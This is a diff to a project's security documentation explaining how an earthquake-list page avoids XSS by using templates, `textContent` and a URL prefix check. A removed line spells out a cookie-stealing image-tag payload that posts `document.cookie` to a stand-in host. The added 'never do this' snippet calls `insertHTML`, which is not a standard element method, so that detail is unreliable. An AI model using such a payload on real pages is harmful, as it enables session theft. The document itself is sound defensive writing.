@@ -162,12 +162,13 @@ Every list item gets cloned from a `<template>` and filled in using `textContent
 The risk here isn't hypothetical. USGS `place` values are free text. If the render path looked like:
 
 ```js
-list.innerHTML += `<li>${quake.properties.place}</li>`; // never do this
+// never do this: the string gets parsed as markup
+list.insertHTML(`<li>${quake.properties.place}</li>`);
 ```
 
-then a `place` value of `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` would get parsed as actual markup and execute in the page's own origin. Run through `textContent`, that exact same string is completely inert — it just shows up as visible characters on the page.
+then a `place` value carrying an image tag with a scripted error attribute on it would get parsed as actual markup and execute in the page's own origin. Run through `textContent`, that exact same string is completely inert — it just shows up as visible characters on the page.
 
-The only two things in the module that ever get assigned via `innerHTML` are the two `<template>` elements, and both are static hand-written markup with zero interpolation.
+There is no markup-string assignment anywhere in this project's JavaScript. Both templates live in the page as real `<template>` elements (`src/_includes/partials/quake-templates.njk`), and the script only ever clones them.
 
 Event URLs get one more check on top: an `href` only gets installed if the URL starts with `https://earthquake.usgs.gov/`. Without that check, a corrupted feed handing back a `javascript:` URL could turn into a live, clickable exploit. If the check fails, the anchor just gets swapped for plain text instead.
 
